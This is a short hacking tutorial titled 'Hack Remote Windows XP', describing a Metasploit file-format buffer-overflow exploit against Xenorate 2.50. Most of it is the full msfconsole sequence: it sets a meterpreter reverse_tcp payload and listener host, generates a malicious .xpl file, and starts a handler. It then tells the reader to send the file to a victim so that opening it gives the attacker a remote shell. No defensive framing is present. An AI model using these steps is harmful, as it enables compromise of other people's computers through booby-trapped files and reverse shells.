Hack Remote Windows XP using Xenorate 2.50 (.xpl) universal Local Buffer Overflow (SEH)

This module exploits a stack buffer overflow in Xenorate 2.50 by creating a specially crafted xpl file.
Xenorate 2.50
Windows XP SP2


Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/xenorate_xpl_bof
Msf exploit (xenorate_xpl_bof)>set payload windows/meterpreter/reverse_tcp
Msf exploit (xenorate_xpl_bof)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (xenorate_xpl_bof)>exploit

After we successfully generate the malicious File, it will stored on your local computer
/root/.msf4/local/msf.xpl

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit 
Now send your msf.xpl files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
